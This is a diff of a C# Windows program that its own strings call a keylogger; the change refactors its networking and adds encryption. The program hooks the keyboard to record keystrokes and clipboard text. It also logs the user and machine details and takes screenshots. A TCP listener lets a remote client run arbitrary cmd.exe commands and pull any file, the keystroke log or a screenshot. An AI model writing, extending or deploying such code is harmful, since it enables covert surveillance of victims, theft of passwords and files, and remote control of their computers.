@@ -1,32 +1,32 @@
-﻿using System;
-using System.Windows;
+﻿using ConstantsLib;
+using NetLib;
+using System;
+using System.Collections.Generic;
 using System.Diagnostics;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
+using System.Drawing;
 using System.IO;
-using System.Text;
 using System.Net;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
-using System.Security.Cryptography;
-using System.Collections.Generic;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.Threading.Tasks;
-using ConstantsLib;
-
+using System.Windows.Forms;
+using Cryptography;
+using System.Security.Cryptography;
 
 //TODO
 //1) chANGE layoutname to culture
 //2) control + special symb
 //3)encrypt
 //4) when client disconnect without quit kill service routine task
+//5) do mutex on log file
 namespace Server
 {
-
-    class Program
+    internal class Program
     {
         #region Dll Import
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -45,25 +45,25 @@ namespace Server
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern int GetWindowThreadProcessId(
+        private static extern int GetWindowThreadProcessId(
             [In] IntPtr hWnd,
             [Out, Optional] IntPtr lpdwProcessId
             );
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern IntPtr GetForegroundWindow();
+        private static extern IntPtr GetForegroundWindow();
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern ushort GetKeyboardLayout(
+        private static extern ushort GetKeyboardLayout(
             [In] int idThread
             );
 
@@ -72,23 +72,26 @@ namespace Server
 
         [DllImport("user32.dll")]
         public static extern int ActivateKeyboardLayout(int HKL, int flags);
-        #endregion
+
+        #endregion Dll Import
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
         private readonly static LowLevelKeyboardProc hookProcedure = HookCallback;
         private static IntPtr hookPtr = IntPtr.Zero;
 
-        static readonly Dictionary<char, char> ruEnDict = new Dictionary<char, char>();
+        private static readonly Dictionary<char, char> ruEnDict = new Dictionary<char, char>();
         static private InputLanguage inputLanguage;
+        static Mutex mutex = new Mutex();
+
 
         [STAThread]
-        static void Main(string[] args)
+        private static void Main(string[] args)
         {
             // Hide
             IntPtr winPtr = GetConsoleWindow();
             //ShowWindow(winPtr, Constants.SW_HIDE);
             File.Delete(Environment.CurrentDirectory + Constants.LogPath);//delete prev log for better debug
-
 
             FillDictionary();
             hookPtr = SetHook(hookProcedure);
@@ -103,61 +106,6 @@ namespace Server
             UnhookWindowsHookEx(hookPtr);
         }
 
-        private static void LogEnvironmentAndUserStat()
-        {
-            Log(String.Format(Constants.UnderscoreLine));
-            Log(String.Format("CurrentDirectory: {0}\r\n", Environment.CurrentDirectory));
-            Log(String.Format("MachineName: {0}\r\n", Environment.MachineName));
-            Log(String.Format("OSVersion: {0}\r\n", Environment.OSVersion.ToString()));
-            Log(String.Format("SystemDirectory: {0}\r\n", Environment.SystemDirectory));
-            Log(String.Format("UserDomainName: {0}\r\n", Environment.UserDomainName));
-            Log(String.Format("UserInteractive: {0}\r\n", Environment.UserInteractive));
-            Log(String.Format("UserName: {0}\r\n", Environment.UserName));
-            Log(String.Format("Clipboard: <**BEGIN**>{0}<**END**>\r\n", Clipboard.GetText(TextDataFormat.Text)));
-            Log(String.Format("Installed languages:"));
-            foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
-                Log(" " + lang.LayoutName);
-            Log("\r\n");
-            Log(String.Format("Layout: {0}\r\n", inputLanguage.LayoutName));
-            Log(String.Format(Constants.UnderscoreLine));
-        }
-        
-        public static void Screenshot()
-        {
-            // делаем скриншот
-            Graphics graph = null;
-            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-
-            graph = Graphics.FromImage(bmp);
-            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-            bmp.Save(Application.StartupPath + Constants.ScreenshotPath);
-        }
-
-        private static void FillDictionary()
-        {
-            string EnAlph = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./↑←↓ ";
-            string RuAlph = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю.↑←↓ ";
-
-            char[] En = EnAlph.ToCharArray();
-            char[] Ru = RuAlph.ToCharArray();
-
-            int a = En.Length;
-            
-            for (int i = 0; i < a; i++)
-            {
-                ruEnDict.Add(En[i], Ru[i]);
-            }
-        }
-
-        private static IntPtr SetHook(LowLevelKeyboardProc llKeyboardProc)
-        {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
-            {
-                return SetWindowsHookEx(Constants.WH_KEYBOARD_LL, llKeyboardProc,GetModuleHandle(curModule.ModuleName), 0);
-            }
-        }
-
         private static void CorrectPresentation(ref string Presentation)
         {
             //correct non alphabetic/numerical symbols
@@ -168,64 +116,82 @@ namespace Server
                     case ("Enter"):
                         Presentation = "\r\n";
                         break;
+
                     case ("Space"):
                         Presentation = " ";
                         break;
+
                     case ("OemPeriod"):
                         Presentation = ".";
                         break;
+
                     case ("Oemcomma"):
                         Presentation = ",";
                         break;
+
                     case ("Back"):
                         Presentation = "←";
                         break;
+
                     case ("Oem5"):
                         Presentation = "\\";
                         break;
+
                     case ("Divide"):
                         Presentation = "/";
                         break;
+
                     case ("CapsLock"):
                         Presentation = "{CAPSLOCK}";
                         break;
+
                     case ("Capital"):
                         Presentation = "{CAPSLOCK}";
                         break;
+
                     case ("Tab"):
                         Presentation = "{TAB}";
                         break;
+
                     case ("Oem1"):
                         Presentation = ";";
                         break;
+
                     case ("OemQuestion"):
                         Presentation = "?";
                         break;
+
                     case ("Назад"):
                         Presentation = "←";
                         break;
+
                     case ("OemSemicolon"):
                         Presentation = ";";
                         break;
+
                     case ("Oemtilde"):
                         Presentation = "~";
                         break;
+
                     case ("PrintScreen"):
                         Presentation = "{PrintScreen}";
                         break;
+
                     case ("Delete"):
                         Presentation = "←";
                         break;
+
                     case ("Alt"):
                         Presentation = "{ALT}";
                         break;
+
                     default:
                         Presentation = "";
                         break;
                 }
             }
             else
-            //translate    
+            //translate
             if (inputLanguage.LayoutName != Constants.USALang)
             {
                 switch (inputLanguage.LayoutName)
@@ -233,6 +199,7 @@ namespace Server
                     case (Constants.RuLang):
                         Presentation = ruEnDict[Presentation[0]].ToString();
                         break;
+
                     default:
                         break;
                 }
@@ -241,7 +208,16 @@ namespace Server
             if (Control.ModifierKeys == Keys.Shift ^ Control.ModifierKeys == Keys.Capital)
                 Presentation = Presentation.ToUpper();
         }
-        
+
+        private static IntPtr SetHook(LowLevelKeyboardProc llKeyboardProc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(Constants.WH_KEYBOARD_LL, llKeyboardProc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if ((nCode >= 0)) // && ((wParam == (IntPtr)WM_KEYDOWN) || (wParam == (IntPtr)WM_SYSKEYDOWN))
@@ -257,12 +233,13 @@ namespace Server
                     ActivateKeyboardLayout(Constants.HKL_NEXT, 0);
                     inputLanguage = InputLanguage.CurrentInputLanguage;
                     Log("<Layout changhed: " + inputLanguage.LayoutName + ">");
-                }else
-
+                }
+                else
 
                 if (wParam == (IntPtr)Constants.WM_KEYDOWN)
                 {
                     #region trash
+
                     //Int32 scanCode = Marshal.ReadInt32(lParam + sizeof(Int32
                     //string scanCodePresentation = kc.ConvertToString((Keys)scanCode);
                     //Console.Write("\n\nvk " + vkCodePresentation);
@@ -275,9 +252,11 @@ namespace Server
                     // inputLanguage = CurrentInputLanguage;
                     // Log("<Layout changhed: " + CurrentInputLanguage.LayoutName + ">");
                     // }
-                    #endregion
-                    
+
+                    #endregion trash
+
                     #region KeyCombinationHandle
+
                     if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                     {
                         logAddStr = "<COPY: " + Clipboard.GetText(TextDataFormat.Text) + ">";
@@ -305,28 +284,28 @@ namespace Server
                     else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                     {
                         logAddStr = "<NEW_TAB>";
-
                     }
                     else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                     {
                         logAddStr = "<CUT>";
                     }
-                    #endregion
+
+                    #endregion KeyCombinationHandle
+
                     else
                     {
                         KeysConverter keyConverter = new KeysConverter();
                         vkCodePresentation = keyConverter.ConvertToString((Keys)vkCode);
                         CorrectPresentation(ref vkCodePresentation);
                     }
-                    
                 }
                 Log(vkCodePresentation + logAddStr);
             }
 
-            return CallNextHookEx(hookPtr, nCode, wParam, lParam);  
+            return CallNextHookEx(hookPtr, nCode, wParam, lParam);
         }
 
-        public static void CreatProcessSendToClientOutputAndWaitTermination(string fileName, string processArgs, Socket client)
+        private static void CreatProcessSendToClientOutputAndWaitTermination(string fileName, string processArgs, Socket client)
         {
             Process process = new Process();
             process.StartInfo.FileName = fileName;
@@ -346,16 +325,10 @@ namespace Server
             process.Close();
             if (string.IsNullOrEmpty(output))
                 output = Constants.NoCmdProcessReply;
-            SendReply(String.Format("{0}\nCommand process on server machine terminates.", output), client);
+            NetOps.SendReply(String.Format("{0}\nCommand process on server machine terminates.", output), client);
         }
 
-        public static void SendReply(string reply, Socket client)
-        {
-            byte[] msg = Encoding.UTF8.GetBytes(reply);
-            client.Send(msg);
-        }
-
-        public static void ServerRoutine()
+        private static void ServerRoutine()
         {
             IPEndPoint listenIPEndPoint = new IPEndPoint(IPAddress.Any, Constants.ListenPort);
             Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -374,12 +347,12 @@ namespace Server
                 catch (Exception ex)
                 {
                     Console.Write(ex.Message);
-                    SendReply(ex.Message, clientSocket);
+                    NetOps.SendReply(ex.Message, clientSocket);
                 }
             }
         }
 
-        public static void ServeOneClient(Socket clientSocket)
+        private static void ServeOneClient(Socket clientSocket)
         {
             bool isServeEnd = false;
             string clientCmd = null;
@@ -405,146 +378,111 @@ namespace Server
                     switch (argv[0])
                     {
                         case "help":
-                            SendReply(Constants.HelpReply, clientSocket);
+                            NetOps.SendReply(Constants.HelpReply, clientSocket);
                             break;
+
                         case "quit":
-                            SendReply("Keylogger closed.", clientSocket);
+                            NetOps.SendReply("Keylogger closed.", clientSocket);
                             isServeEnd = true;
                             break;
+
                         case "cmd":
                             if (arguments.Length == 0)
                                 throw new Exception("\nCmd needs arguments.");
                             CreatProcessSendToClientOutputAndWaitTermination("cmd.exe", "/C" + arguments, clientSocket); // /C Carries out the command specified by string and then terminates
                             break;
+
                         case "load":
                             if (arguments.Length == 0)
                                 throw new Exception("\nLoad needs path.");
-                            SendFile(arguments, clientSocket);
-                            break;
-                        case "screen":
-                            Screenshot();
-                            SendFile(Application.StartupPath + Constants.ScreenshotPath, clientSocket);
-                            break;
-                        case "log":
-                            SendFile(Application.StartupPath + Constants.LogPath, clientSocket);
-                            break;
-                        default:
-                            SendReply("Invalid cmd. Call HELP", clientSocket);
+                            PrepareAndSendFile(arguments, clientSocket);
                             break;
 
+                        case "screen":
+                            Screenshot();
+                            PrepareAndSendFile(Application.StartupPath + Constants.ScreenshotPath, clientSocket);
+                            break;
+
+                        case "log":
+                            PrepareAndSendFile(Application.StartupPath + Constants.LogPath, clientSocket);
+                            break;
+
+                        default:
+                            NetOps.SendReply("Invalid cmd. Call HELP", clientSocket);
+                            break;
                     }
                 }
                 catch (Exception ex)
                 {
                     Console.Write(ex.Message);
-                    SendAcknowledgement(Constants.ACK_ERROR, clientSocket);
-                    SendReply(ex.Message, clientSocket);
+                    NetOps.SendAcknowledgement(Constants.ACK_ERROR, clientSocket);
+                    NetOps.SendReply(ex.Message, clientSocket);
                 }
             }
-            
         }
 
-        public static void SendFile(string filePath, Socket client)
+        private static void PrepareAndSendFile(string filePath, Socket receiver)
         {
-            byte[] fileNameBytes = Encoding.ASCII.GetBytes(Path.GetFileName(filePath));
-            byte[] fileNameLenBytes = BitConverter.GetBytes(fileNameBytes.Length);
-            byte[] fileContent = File.ReadAllBytes(filePath);
-            byte[] fileContentLen = BitConverter.GetBytes(fileContent.Length);
-            byte[] sendBuf = new byte[fileContent.Length | (sizeof(int) + fileNameBytes.Length + sizeof(int))];//Marshal.SizeOf(filePath.Length)
+            mutex.WaitOne();
+            CryptOps.Encrypt(filePath, filePath + Constants.EncryptExtension, Constants.CryptoKey);
+            NetOps.SendFile(filePath + Constants.EncryptExtension, receiver);//filePath , filePath + Constants.EncryptExtension
+            //File.Delete(filePath + Constants.EncryptExtension);
+            mutex.ReleaseMutex();
+        }
 
-            fileNameLenBytes.CopyTo(sendBuf, 0);
-            fileNameBytes.CopyTo(sendBuf, sizeof(int));
-            fileContentLen.CopyTo(sendBuf, sizeof(int) + fileNameBytes.Length);
+        private static void Screenshot()
+        {
+            Graphics graph = null;
+            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
 
-            SendAcknowledgement(Constants.ACK_OK, client);
-            client.Send(sendBuf, sizeof(int) + fileNameBytes.Length + sizeof(int), SocketFlags.None);
-            if (GetAcknowlegment(client) == Constants.ACK_OK)
+            graph = Graphics.FromImage(bmp);
+            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+            bmp.Save(Application.StartupPath + Constants.ScreenshotPath);
+        }
+
+        private static void FillDictionary()
+        {
+            string EnAlph = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./↑←↓ ";
+            string RuAlph = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю.↑←↓ ";
+
+            char[] En = EnAlph.ToCharArray();
+            char[] Ru = RuAlph.ToCharArray();
+
+            int a = En.Length;
+
+            for (int i = 0; i < a; i++)
             {
-                fileContent.CopyTo(sendBuf, 0);//отпрравляет сразу и служебную инфу и контент а клиент думает что это только служебная
-                client.Send(sendBuf, fileContent.Length, SocketFlags.None);
-                Console.WriteLine("File:{0} has been sent.", filePath);
+                ruEnDict.Add(En[i], Ru[i]);
             }
         }
 
-        public static void SendAcknowledgement(int ACK, Socket socket)
+        private static void Log(string inputstring)
         {
-            socket.Send(BitConverter.GetBytes(ACK));
-        }
-
-        public static int GetAcknowlegment(Socket socket)
-        {
-            byte[] buf = new byte[sizeof(int)];
-            socket.Receive(buf, sizeof(int), SocketFlags.None);
-            return BitConverter.ToInt32(buf, 0);
-        }
-
-        public static void Log(string inputstring)
-        {
+            mutex.WaitOne();
             StreamWriter sw = new StreamWriter(Application.StartupPath + ConstantsLib.Constants.LogPath, true);
             sw.Write(inputstring);
             sw.Flush();
             sw.Close();
+            mutex.ReleaseMutex();
         }
 
-        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
+        private static void LogEnvironmentAndUserStat()
         {
-            return plainText;///
-
-            if (string.IsNullOrEmpty(plainText))
-                return "";
-
-            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
-            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
-            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
-
-            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
-             (password, saltValueBytes, hashAlgorithm, passwordIterations);
-
-            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
-            RijndaelManaged symmetricKey = new RijndaelManaged();
-            symmetricKey.Mode = CipherMode.CBC;
-
-            byte[] cipherTextBytes = null;
-
-            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
-            (keyBytes, initialVectorBytes))
-            {
-                using (MemoryStream memStream = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream
-                             (memStream, encryptor, CryptoStreamMode.Write))
-                    {
-                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
-                        cryptoStream.FlushFinalBlock();
-                        cipherTextBytes = memStream.ToArray();
-                        memStream.Close();
-                        cryptoStream.Close();
-                    }
-                }
-            }
-
-            symmetricKey.Clear();
-            return Convert.ToBase64String(cipherTextBytes);
+            Log(String.Format(Constants.UnderscoreLine));
+            Log(String.Format("CurrentDirectory: {0}\r\n", Environment.CurrentDirectory));
+            Log(String.Format("MachineName: {0}\r\n", Environment.MachineName));
+            Log(String.Format("OSVersion: {0}\r\n", Environment.OSVersion.ToString()));
+            Log(String.Format("SystemDirectory: {0}\r\n", Environment.SystemDirectory));
+            Log(String.Format("UserDomainName: {0}\r\n", Environment.UserDomainName));
+            Log(String.Format("UserInteractive: {0}\r\n", Environment.UserInteractive));
+            Log(String.Format("UserName: {0}\r\n", Environment.UserName));
+            Log(String.Format("Clipboard: <**BEGIN**>{0}<**END**>\r\n", Clipboard.GetText(TextDataFormat.Text)));
+            Log(String.Format("Installed languages:"));
+            foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
+                Log(" " + lang.LayoutName);
+            Log("\r\n");
+            Log(String.Format("Layout: {0}\r\n", inputLanguage.LayoutName));
+            Log(String.Format(Constants.UnderscoreLine));
         }
-
-        static ushort GetKeyboardLayout()
-        {
-            #region trash
-            ////Console.WriteLine("GetForegroundWindow()  = " + GetForegroundWindow());
-            ////Console.WriteLine("GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero))  = " + GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
-            //Console.WriteLine("GetKeyboardLayout  = " + GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)));
-            //const int KL_NAMELENGTH = 9;
-            //var langCode = new StringBuilder(KL_NAMELENGTH);
-            //GetKeyboardLayoutName(langCode);
-
-            //Console.WriteLine("langCode.ToString()  = " + langCode.ToString());
-            //return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
-            #endregion
-            //IntPtr layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
-            //StringBuilder layout;
-            //GetKeyboardLayoutName(Input);
-            return 1; //Input
-        }
-
     }
 }
